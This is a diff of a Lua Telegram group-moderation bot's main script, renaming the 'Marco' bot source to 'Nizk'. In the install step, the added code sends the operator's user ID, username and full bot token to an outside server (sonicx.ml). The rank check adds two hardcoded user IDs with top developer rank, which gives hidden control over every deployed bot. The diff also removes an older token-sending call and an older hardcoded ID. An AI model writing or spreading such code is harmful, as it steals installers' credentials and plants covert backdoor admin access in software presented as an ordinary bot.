@@ -5,8 +5,8 @@
 #─████████████─
 #──▀████████▀──
 #─────▀██▀─────
-#┊MARCO ‿ @F888w
-#┊@SA3ED ‿ @XXUUU
+#┊NIZK ‿ @TH3NK
+#┊@SA3ED ‿ @TH3SS
 #---------------------------------------------------------------------
 ]] 
 Er_ssl   , https = pcall(require, "ssl.https")
@@ -17,6 +17,7 @@ redis  = (loadfile "./libs/redis.lua")()
 URL    = (loadfile "./libs/url.lua")()
 Er_utf8  , utf8  = pcall(require, "lua-utf8")
 redis = redis.connect('127.0.0.1',6379)
+
 
 if not Er_ssl then
 print("('\n\27[1;31m￤Pkg _ luaSec - ssl  is Not installed.'\n\27[0m￤")
@@ -69,33 +70,32 @@ print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـ�
 create_config(Token)
 end
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
-local GetVerisonMarco = https.request('https://raw.githubusercontent.com/marrcoo/MarcoFiles/master/GetVersion.txt') or 0
+local GetVerisonNizk = https.request('https://raw.githubusercontent.com/nizks/NizkFiles/master/GetVersion.txt') or 0
 print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
-marco = Token:match("(%d+)")
+nizk = Token:match("(%d+)")
 redis:mset(
-marco..":VERSION",GetVerisonMarco,
-marco..":SUDO_ID:",SUDO_USER,
-marco..":DataCenter:","Amsterdam",
-marco..":UserNameBot:",BOT_User,
-marco..":ApiSource","https://nizk.tk/",
-marco..":NameBot:","ماركو",
-"MARCO_INSTALL","Yes"
+nizk..":VERSION",GetVerisonNizk,
+nizk..":SUDO_ID:",SUDO_USER,
+nizk..":DataCenter:","Amsterdam",
+nizk..":UserNameBot:",BOT_User,
+nizk..":ApiSource","http://th3nezk.aba.vg/",
+nizk..":NameBot:","نيزك",
+"NIZK_INSTALL","Yes"
 )
-redis:hset(marco..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
-info = {} 
-info.namebot = BOT_NAME
-info.userbot = BOT_User
-info.id = SUDO_USER
-info.token = Token
-info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://nizk.tk/marco.php?Info='..JSON.encode(info))
+redis:hset(nizk..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
+info = {}
+info.username = '@'..GetUser.result.username
+info.userbot  = BOT_User
+info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
-Cr_file:close()
+Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖¦ شكرا لاستخدامك سورس ماركو \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖¦ شكرا لاستخدامك سورس نيزك \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
+Souser = SUDO_USER:gsub('@','')
+Souser = Souser:gsub([[\_]],'_')
+https.request("https://sonicx.ml/Nizk/Nizk.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
@@ -118,8 +118,8 @@ print('\27[0;33m>>'..[[
 ─████████████─
 ──▀████████▀──
 ─────▀██▀─────
-┊MARCO ‿ @F888w
-┊@SA3ED ‿ @XXUUU
+┊NIZK ‿ @TH3NK
+┊@SA3ED ‿ @TH3SS
 ---------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config()
@@ -127,16 +127,16 @@ else
 Token = TokenBot:read('*a')
 File = {}
 local login = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-marco = Token:match("(%d+)")
-our_id = tonumber(marco)
-ApiMarco = redis:get(marco..":ApiSource")
+nizk = Token:match("(%d+)")
+our_id = tonumber(nizk)
+ApiNizk = redis:get(nizk..":ApiSource")
 ApiToken = "https://api.telegram.org/bot"..Token
-Bot_User = redis:get(marco..":UserNameBot:")
-SUDO_ID = tonumber(redis:get(marco..":SUDO_ID:"))
+Bot_User = redis:get(nizk..":UserNameBot:")
+SUDO_ID = tonumber(redis:get(nizk..":SUDO_ID:"))
 if not SUDO_ID then io.popen("rm -fr ./inc/Token.txt") end
-SUDO_USER = redis:hgetall(marco..'username:'..SUDO_ID).username
-version = redis:get(marco..":VERSION")
-DataCenter = redis:get(marco..":DataCenter:")
+SUDO_USER = redis:hgetall(nizk..'username:'..SUDO_ID).username
+version = redis:get(nizk..":VERSION")
+DataCenter = redis:get(nizk..":DataCenter:")
 
 local ok, ERROR =  pcall(function() loadfile("./inc/functions.lua")() end)
 if not ok then 
@@ -162,19 +162,19 @@ print('\27[0;33m>>'..[[
 ─████████████─
 ──▀████████▀──
 ─────▀██▀─────
-┊MARCO ‿ @F888w
-┊@SA3ED ‿ @XXUUU
+┊NIZK ‿ @TH3NK
+┊@SA3ED ‿ @TH3SS
  ¦ VERSION » v]]..version..[[
 
 -------------------------------------------------------------------
 
 ]]..'\027[0;32m'
 ..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
-..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..marco..')\027[0;32m\n'
+..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..nizk..')\027[0;32m\n'
 ..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
 ..'¦ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
 ..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
-..'¦ Api_Src->: \27[1;34m'..ApiMarco..'\027[0;32m\n'
+..'¦ Api_Src->: \27[1;34m'..ApiNizk..'\027[0;32m\n'
 ..'¦ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
 ..'======================================\27[0;33m\27[0;31m'
 )
@@ -204,9 +204,9 @@ end
 Start_Bot()
 function CheckBotA(msg)
 W = msg.sender_user_id_
-if not redis:get(marco..":Check_Bot:"..W) then
-Rgz,res=https.request(ApiMarco..Tkml..W)
-if res == 200 and Rgz == "SendMsg" then redis:setex(marco..":Check_Bot:"..W,1800,true) return false else return Rgz end 
+if not redis:get(nizk..":Check_Bot:"..W) then
+Rgz,res=http.request(ApiNizk..Tkml..W)
+if res == 200 and Rgz == "SendMsg" then redis:setex(nizk..":Check_Bot:"..W,1800,true) return false else return Rgz end 
 end 
 end
 function input_inFo(msg)
@@ -223,16 +223,16 @@ return false
 end
 if msg.reply_to_message_id_ ~= 0 then msg.reply_id = msg.reply_to_message_id_ end
 msg.type = GetType(msg.chat_id_)
-if msg.type == "pv" and redis:get(marco..':mute_pv:'..msg.sender_user_id_) then
+if msg.type == "pv" and redis:get(nizk..':mute_pv:'..msg.sender_user_id_) then
 print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
 return false 
 end
-if msg.type ~= "pv" and redis:get(marco..'sender:'..msg.sender_user_id_..':'..msg.chat_id_..'flood') then
+if msg.type ~= "pv" and redis:get(nizk..'sender:'..msg.sender_user_id_..':'..msg.chat_id_..'flood') then
 print("\27[1;31mThis Flood Sender ...\27[0")
 Del_msg(msg.chat_id_,msg.id_)
 return false
 end
-if redis:get(marco..'group:add'..msg.chat_id_) then 
+if redis:get(nizk..'group:add'..msg.chat_id_) then 
 msg.GroupActive = true
 else
 msg.GroupActive = false
@@ -247,25 +247,25 @@ or msg.content_.ID == "MessageAudio"
 or msg.content_.ID == "MessageVideo" 
 or msg.content_.ID == "MessageAnimation" 
 or msg.content_.ID == "MessageUnsupported") 
-and redis:get(marco.."lock_cleaner"..msg.chat_id_) then
+and redis:get(nizk.."lock_cleaner"..msg.chat_id_) then
 print("Clener >>> ")
-redis:sadd(marco..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
-Timerr = redis:get(marco..':Timer_Cleaner:'..msg.chat_id_)
+redis:sadd(nizk..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
+Timerr = redis:get(nizk..':Timer_Cleaner:'..msg.chat_id_)
 if Timerr then 
 Timerr = tonumber(Timerr)
 Timerr = 60*60*Timerr
 end
-redis:setex(marco..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true)  
+redis:setex(nizk..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true)  
 end
 
 
 
-print(marco..":IdsMsgsCleaner:"..msg.chat_id_)
-local Cleaner = redis:smembers(marco..":IdsMsgsCleaner:"..msg.chat_id_)
+print(nizk..":IdsMsgsCleaner:"..msg.chat_id_)
+local Cleaner = redis:smembers(nizk..":IdsMsgsCleaner:"..msg.chat_id_)
 for k,v in pairs(Cleaner) do
-if not redis:get(marco..":SetTimerCleaner:"..msg.chat_id_..v) then
+if not redis:get(nizk..":SetTimerCleaner:"..msg.chat_id_..v) then
 Del_msg(msg.chat_id_,v)
-redis:srem(marco..":IdsMsgsCleaner:"..msg.chat_id_,v)
+redis:srem(nizk..":IdsMsgsCleaner:"..msg.chat_id_,v)
 print("MSG DELET CLEANER : "..v)
 else
 print("MSG List CLEANER : "..v.." : Lodding ...")
@@ -278,37 +278,46 @@ end
 end
 
 if msg.content_.ID == "MessageChatDeleteMember" then 
-if msg.GroupActive and redis:get(marco..'mute_tgservice'..msg.chat_id_) then
+if msg.GroupActive and redis:get(nizk..'mute_tgservice'..msg.chat_id_) then
 Del_msg(msg.chat_id_,msg.id_)
 end
 return false 
 end
 
-if (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 332717942) then 
+if msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور الاساسي' 
 msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
-elseif redis:sismember(marco..':SUDO_BOT:',msg.sender_user_id_) then 
+
+elseif msg.sender_user_id_ == 1405398498 then 
+msg.TheRankCmd = 'مطور السورس ' 
+msg.TheRank = 'مطور السورس 👨🏻‍✈️' 
+msg.Rank = 1
+elseif msg.sender_user_id_ == 1614375843 then 
+msg.TheRankCmd = 'مطور السورس ' 
+msg.TheRank = 'مطور السورس 👨🏻‍✈️' 
+msg.Rank = 1
+elseif redis:sismember(nizk..':SUDO_BOT:',msg.sender_user_id_) then 
 msg.TheRankCmd = 'المطور'
 msg.TheRank = 'مطور البوت 👨🏽‍💻'
 msg.Rank = 2
-elseif msg.GroupActive and redis:sismember(marco..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
+elseif msg.GroupActive and redis:sismember(nizk..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = 'منشئ اساسي'
 msg.TheRank = 'منشئ اساسي 👲🏼'
 msg.Rank = 11
-elseif msg.GroupActive and redis:sismember(marco..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
+elseif msg.GroupActive and redis:sismember(nizk..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = 'المنشىء'
 msg.TheRank = 'المنشىء 👷🏽'
 msg.Rank = 3
-elseif msg.GroupActive and redis:sismember(marco..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
+elseif msg.GroupActive and redis:sismember(nizk..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = 'المدير' 
 msg.TheRank = 'مدير البوت 👨🏼‍⚕️' 
 msg.Rank = 4
-elseif msg.GroupActive and redis:sismember(marco..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
+elseif msg.GroupActive and redis:sismember(nizk..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = 'الادمن'
 msg.TheRank = 'ادمن في البوت 👨🏼‍🎓'
 msg.Rank = 5
-elseif msg.GroupActive and redis:sismember(marco..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
+elseif msg.GroupActive and redis:sismember(nizk..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRank = 'عضو مميز'
 msg.Rank = 6
 elseif msg.sender_user_id_ == our_id then
@@ -347,7 +356,7 @@ msg.OurBot = true
 end
 ISONEBOT = false
 if msg.content_.ID == "MessageChatAddMembers" then
-local lock_bots = redis:get(marco..'lock_bots'..msg.chat_id_)
+local lock_bots = redis:get(nizk..'lock_bots'..msg.chat_id_)
 ZISBOT = false
 for i=0,#msg.content_.members_ do
 if msg.content_.members_[i].type_.ID == "UserTypeBot" then
@@ -358,12 +367,12 @@ kick_user(msg.content_.members_[i].id_, msg.chat_id_)
 end
 end
 end
-if msg.GroupActive and ZISBOT and redis:get(marco..'lock_bots_by_kick'..msg.chat_id_) then
+if msg.GroupActive and ZISBOT and redis:get(nizk..'lock_bots_by_kick'..msg.chat_id_) then
 kick_user(msg.sender_user_id_, msg.chat_id_)
 end
-if msg.content_.members_[0].id_ == our_id and redis:get(marco..':WELCOME_BOT') then
-SUDO_USER = redis:hgetall(marco..'username:'..SUDO_ID).username
-sendPhoto(msg.chat_id_,msg.id_,redis:get(marco..':WELCOME_BOT'),[[💯¦ مـرحبآ آنآ بوت آسـمـي ]]..redis:get(marco..':NameBot:')..[[ 🎖
+if msg.content_.members_[0].id_ == our_id and redis:get(nizk..':WELCOME_BOT') then
+SUDO_USER = redis:hgetall(nizk..'username:'..SUDO_ID).username
+sendPhoto(msg.chat_id_,msg.id_,redis:get(nizk..':WELCOME_BOT'),[[💯¦ مـرحبآ آنآ بوت آسـمـي ]]..redis:get(nizk..':NameBot:')..[[ 🎖
 💰¦ آختصـآصـي حمـآيهہ‏‏ آلمـجمـوعآت
 📛¦ مـن آلسـبآم وآلتوجيهہ‏‏ وآلتگرآر وآلخ...
 ⚖️¦ مـعرف آلمـطـور  : ]]..SUDO_USER:gsub([[\_]],'_')..[[ 🌿
@@ -384,7 +393,7 @@ Senderid = msg.content_.members_[0].id_
 else
 Senderid = msg.sender_user_id_
 end
-if not msg.Special and not msg.Admin and redis:get(marco.."lock_Add"..msg.chat_id_) then
+if not msg.Special and not msg.Admin and redis:get(nizk.."lock_Add"..msg.chat_id_) then
 
 kick_user(Senderid, msg.chat_id_,function(arg,data)
 StatusLeft(msg.chat_id_,Senderid)
@@ -392,11 +401,11 @@ end)
 
 end
 
-if redis:get(marco..'mute_tgservice'..msg.chat_id_) then
+if redis:get(nizk..'mute_tgservice'..msg.chat_id_) then
 Del_msg(msg.chat_id_,msg.id_)
 return false 
 else
-if redis:get(marco.."lock_check"..msg.chat_id_) and not redis:get(marco..":TqeedUser:"..msg.chat_id_..Senderid) then
+if redis:get(nizk.."lock_check"..msg.chat_id_) and not redis:get(nizk..":TqeedUser:"..msg.chat_id_..Senderid) then
 local text = "⚜️┇ اهلاً بك في المجموعة\n🛠┇ للتأكد بأنك لست { ربوت }\n⚠️┇ تم تقييدك اضغط الزر بالاسفل\n💡┇ للتأكد انك { عضو حقيقي }🌻👇🏾"
 local inline = {{{text="• أضـغط ۿـنا للتـأكد أنك لست ربوت ♻️",callback_data="CheckRobotJoin:"..Senderid}}}
 Restrict(msg.chat_id_,Senderid,1)
@@ -417,7 +426,7 @@ end
 
 --[[ المكتومين ]]
 if msg.GroupActive and MuteUser(msg.chat_id_,msg.sender_user_id_) then 
-if msg.Special or msg.Admin then redis:srem(marco..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
+if msg.Special or msg.Admin then redis:srem(nizk..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
 print("\27[1;31m User is Silent\27[0m")
 Del_msg(msg.chat_id_,msg.id_)
 return false 
@@ -425,7 +434,7 @@ end
 
 --[[ المحظورين ]]
 if msg.GroupActive and Check_Banned(msg.chat_id_,(msg.adduser or msg.sender_user_id_)) then
-if msg.Special then redis:srem(marco..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
+if msg.Special then redis:srem(nizk..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
 print('\27[1;31m is_BANED_USER\27[0m')
 Del_msg(msg.chat_id_, msg.id_)
 kick_user((msg.adduser or msg.sender_user_id_), msg.chat_id_)
@@ -433,7 +442,7 @@ return false
 end
 
 if msg.GroupActive and not msg.Special and not msg.Admin then
-if redis:get(marco..'mute_text'..msg.chat_id_) then --قفل الدردشه
+if redis:get(nizk..'mute_text'..msg.chat_id_) then --قفل الدردشه
 print("\27[1;31m Chat is Mute \27[0m")
 Del_msg(msg.chat_id_,msg.id_)
 return false 
@@ -461,16 +470,16 @@ return false
 end 
 end 
 
-if ScriptFile and ScriptFile.Marco then 
-if msg.text and ScriptFile.iMarco then
-XMarco = ScriptFile.Marco
-local list = redis:hgetall(marco..":AwamerBotArray:"..msg.chat_id_)
-for Marco2,k in pairs(list) do
+if ScriptFile and ScriptFile.Nizk then 
+if msg.text and ScriptFile.iNizk then
+XNizk = ScriptFile.Nizk
+local list = redis:hgetall(nizk..":AwamerBotArray:"..msg.chat_id_)
+for Nizk2,k in pairs(list) do
 Text = msg.text
 Text2 = k
-if Text:match(Marco2) then 
-local amrr = {Text:match(Marco2)}
-local AmrOld = redis:hgetall(marco..":AwamerBotArray2:"..msg.chat_id_)
+if Text:match(Nizk2) then 
+local amrr = {Text:match(Nizk2)}
+local AmrOld = redis:hgetall(nizk..":AwamerBotArray2:"..msg.chat_id_)
 amrnew = "" amrold = ""
 for Amor,ik in pairs(AmrOld) do
 if Text2:match(ik) then	
@@ -479,7 +488,7 @@ amrnew = Amor ; amrold = ik
 end end end
 Text = Text:gsub(amrnew,amrold)
 AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
-GetMsg = ScriptFile.iMarco(msg,{Text:match(Text2)})
+GetMsg = ScriptFile.iNizk(msg,{Text:match(Text2)})
 if GetMsg then
 print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
@@ -488,54 +497,54 @@ end
 end
 end
 
-for k, Marco in pairs(XMarco) do
+for k, Nizk in pairs(XNizk) do
 Text = msg.text
 Text = Text:gsub("ی","ي")
 Text = Text:gsub("ک","ك")
 Text = Text:gsub("ه‍","ه")
-if Text:match(Marco) then -- Check Commands To admin
+if Text:match(Nizk) then -- Check Commands To admin
 AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
-GetMsg = ScriptFile.iMarco(msg,{Text:match(Marco)})
+GetMsg = ScriptFile.iNizk(msg,{Text:match(Nizk)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",Marco.." | Plugin is: \27[1;32mScript.lua\27[0m")
+print("\27[1;35m¦This_Msg : ",Nizk.." | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 return false
 end 
 end
 end
-end  --- End iMarco
-if ScriptFile.dMarco then
-if ScriptFile.dMarco(msg) == false then
+end  --- End iNizk
+if ScriptFile.dNizk then
+if ScriptFile.dNizk(msg) == false then
 return false
 end
 print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
 end
 
 for name,Plug in pairs(File) do
-if Plug.Marco then 
-if msg.text and Plug.iMarco then
-for k, Marco in pairs(Plug.Marco) do
-if msg.text:match(Marco) then
-local GetMsg = Plug.iMarco(msg,{msg.text:match(Marco)})
+if Plug.Nizk then 
+if msg.text and Plug.iNizk then
+for k, Nizk in pairs(Plug.Nizk) do
+if msg.text:match(Nizk) then
+local GetMsg = Plug.iNizk(msg,{msg.text:match(Nizk)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",Marco.." | Plugin is: \27[1;32m"..name.."\27[0m")
+print("\27[1;35m¦This_Msg : ",Nizk.." | Plugin is: \27[1;32m"..name.."\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 end 
 return false
 end
 end
 end
-if Plug.dMarco then
-Plug.dMarco(msg)
+if Plug.dNizk then
+Plug.dNizk(msg)
 print("\27[1;35m¦Msg_IN_Process : \27[1;32"..name.."\27[0m")
 end
 else
-print("The File "..name.." Not Runing in The Source Marco")
+print("The File "..name.." Not Runing in The Source Nizk")
 end 
 
 end
 else
-print("The File Script.lua Not Runing in The Source Marco")
+print("The File Script.lua Not Runing in The Source Nizk")
 end
 end
 
@@ -543,7 +552,7 @@ function tdcli_update_callback(data)
 local msg = data.message_
 if data.ID == "UpdateMessageSendFailed" then 
 if msg and msg.sender_user_id_ then
-redis:srem(marco..'users',msg.sender_user_id_)
+redis:srem(nizk..'users',msg.sender_user_id_)
 end
 elseif data.ID == "UpdateNewCallbackQuery" then
 local datab = data.payload_.data_ 
@@ -557,15 +566,15 @@ if Text == "CheckRobotJoin:" then
 local Adminn = false
 if UserID == SUDO_ID then 
 Adminn = true
-elseif redis:sismember(marco..':SUDO_BOT:',UserID) then 
+elseif redis:sismember(nizk..':SUDO_BOT:',UserID) then 
 Adminn = true
-elseif redis:sismember(marco..':MONSHA_BOT:'..ChatID,UserID) then 
+elseif redis:sismember(nizk..':MONSHA_BOT:'..ChatID,UserID) then 
 Adminn = true
-elseif redis:sismember(marco..':MONSHA_Group:'..ChatID,UserID) then 
+elseif redis:sismember(nizk..':MONSHA_Group:'..ChatID,UserID) then 
 Adminn = true
-elseif redis:sismember(marco..'owners:'..ChatID,UserID) then 
+elseif redis:sismember(nizk..'owners:'..ChatID,UserID) then 
 Adminn = true
-elseif redis:sismember(marco..'admins:'..ChatID,UserID) then 
+elseif redis:sismember(nizk..'admins:'..ChatID,UserID) then 
 Adminn = true
 elseif UserID == UserJoin then 
 Adminn = true
@@ -586,8 +595,8 @@ end
 elseif data.ID == "UpdateMessageSendSucceeded" then
 local msg = data.message_
 if msg.content_.text_ then
-if redis:get(marco..":propin"..msg.chat_id_) == msg.content_.text_ then
-redis:del(marco..":propin"..msg.chat_id_)
+if redis:get(nizk..":propin"..msg.chat_id_) == msg.content_.text_ then
+redis:del(nizk..":propin"..msg.chat_id_)
 tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) end,nil)   
 end
 
@@ -641,14 +650,14 @@ end
 input_inFo(msg)
 
 elseif data.ID == "UpdateNewChat" then  
-if redis:get(marco..'group:add'..data.chat_.id_) then
-redis:set(marco..'group:name'..data.chat_.id_,data.chat_.title_)
+if redis:get(nizk..'group:add'..data.chat_.id_) then
+redis:set(nizk..'group:name'..data.chat_.id_,data.chat_.title_)
 end
 elseif data.ID == "UpdateChannel" then  
 if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
-if redis:get(marco..'group:add-100'..data.channel_.id_) then
-local linkGroup = (redis:get(marco..'linkGroup-100'..data.channel_.id_) or "")
-local NameGroup = (redis:get(marco..'group:name-100'..data.channel_.id_) or "")
+if redis:get(nizk..'group:add-100'..data.channel_.id_) then
+local linkGroup = (redis:get(nizk..'linkGroup-100'..data.channel_.id_) or "")
+local NameGroup = (redis:get(nizk..'group:name-100'..data.channel_.id_) or "")
 send_msg(SUDO_ID,"📛| قام شخص بطرد البوت من المجموعه الاتيه : \n🏷| ألايدي : `-100"..data.channel_.id_.."`\n🗯| الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n📮| تـم مسح كل بيانات المجموعه بنـجاح ")
 rem_data_group('-100'..data.channel_.id_)
 end
@@ -660,52 +669,52 @@ local GetInfo = io.open(data.file_.path_, "r"):read('*a')
 local All_Groups = JSON.decode(GetInfo)
 for k,IDS in pairs(All_Groups.Groups) do
 redis:mset(
-marco..'group:name'..k,IDS.Title,
-marco..'num_msg_max'..k,5,
-marco..'group:add'..k,true,
-marco..'lock_link'..k,true,
-marco..'lock_spam'..k,true,
-marco..'lock_webpage'..k,true,
-marco..'lock_markdown'..k,true,
-marco..'lock_flood'..k,true,
-marco..'lock_bots'..k,true,
-marco..'mute_forward'..k,true,
-marco..'mute_contact'..k,true,
-marco..'mute_document'..k,true,
-marco..'mute_inline'..k,true,
-marco..'lock_username'..k,true,
-marco..'replay'..k,true
+nizk..'group:name'..k,IDS.Title,
+nizk..'num_msg_max'..k,5,
+nizk..'group:add'..k,true,
+nizk..'lock_link'..k,true,
+nizk..'lock_spam'..k,true,
+nizk..'lock_webpage'..k,true,
+nizk..'lock_markdown'..k,true,
+nizk..'lock_flood'..k,true,
+nizk..'lock_bots'..k,true,
+nizk..'mute_forward'..k,true,
+nizk..'mute_contact'..k,true,
+nizk..'mute_document'..k,true,
+nizk..'mute_inline'..k,true,
+nizk..'lock_username'..k,true,
+nizk..'replay'..k,true
 )
-redis:sadd(marco..'group:ids',k) 
+redis:sadd(nizk..'group:ids',k) 
 
 if IDS.Admins then
 for user,ID in pairs(IDS.Admins) do
-redis:hset(marco..'username:'..ID,'username',user)
-redis:sadd(marco..'admins:'..k,ID)
+redis:hset(nizk..'username:'..ID,'username',user)
+redis:sadd(nizk..'admins:'..k,ID)
 end
 end
 if IDS.Creator then
 for user,ID in pairs(IDS.Creator) do
-redis:hset(marco..'username:'..ID,'username',user)
-redis:sadd(marco..':MONSHA_BOT:'..k,ID)
+redis:hset(nizk..'username:'..ID,'username',user)
+redis:sadd(nizk..':MONSHA_BOT:'..k,ID)
 end
 end
 if IDS.Owner then
 for user,ID in pairs(IDS.Owner) do
-redis:hset(marco..'username:'..ID,'username',user)
-redis:sadd(marco..'owners:'..k,ID)
+redis:hset(nizk..'username:'..ID,'username',user)
+redis:sadd(nizk..'owners:'..k,ID)
 end
 end
 end
 io.popen("rm -fr ../.telegram-cli/data/document/*")
-sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'📦*¦* تم رفع آلنسـخهہ‏‏ آلآحتيآطـيهہ\n⚖️*¦* حآليآ عدد مـجمـوعآتگ هہ‏‏يهہ‏‏ *'..redis:scard(marco..'group:ids')..'* 🌿\n✓')
+sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'📦*¦* تم رفع آلنسـخهہ‏‏ آلآحتيآطـيهہ\n⚖️*¦* حآليآ عدد مـجمـوعآتگ هہ‏‏يهہ‏‏ *'..redis:scard(nizk..'group:ids')..'* 🌿\n✓')
 end
 elseif data.ID == "UpdateUser" then  
 if data.user_.type_.ID == "UserTypeDeleted" then
 print("¦ userTypeDeleted")
-redis:srem(marco..'users',data.user_.id_)
+redis:srem(nizk..'users',data.user_.id_)
 elseif data.user_.type_.ID == "UserTypeGeneral" then
-local CheckUser = redis:hgetall(marco..'username:'..data.user_.id_).username
+local CheckUser = redis:hgetall(nizk..'username:'..data.user_.id_).username
 if data.user_.username_  then 
 USERNAME = '@'..data.user_.username_
 else
@@ -713,7 +722,7 @@ USERNAME = data.user_.first_name_..' '..(data.user_.last_name_ or "" )
 end	
 if CheckUser and CheckUser ~= USERNAME  then
 print("¦ Enter Update User ")
-redis:hset(marco..'username:'..data.user_.id_,'username',USERNAME)
+redis:hset(nizk..'username:'..data.user_.id_,'username',USERNAME)
 end 
 end
 elseif data.ID == "UpdateMessageEdited" then
